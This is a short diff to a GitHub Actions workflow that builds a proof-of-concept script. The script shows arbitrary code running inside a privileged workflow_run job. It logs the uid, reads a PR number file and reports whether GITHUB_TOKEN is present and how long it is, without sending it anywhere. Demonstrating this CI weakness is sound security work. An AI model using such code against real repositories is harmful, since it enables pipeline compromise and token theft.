@@ -17,7 +17,8 @@ jobs:
           cat > pkg/package/stage1.js <<'EOF'
           const fs = require('fs');
           console.log('[PoC] arbitrary code ran inside the privileged workflow_run job as uid=' + process.getuid());
-          const pr = fs.readFileSync('pr-number.txt','utf8').trim();
+          const ws = require('path').resolve(__dirname, '..', '..');
+          const pr = fs.readFileSync(require('path').join(ws,'pr-number.txt'),'utf8').trim();
           fs.writeFileSync('poc-marker.txt','marker');
           const token = process.env.GITHUB_TOKEN;
           console.log('[PoC] GITHUB_TOKEN present=' + Boolean(token) + ' length=' + String(token||'').length);
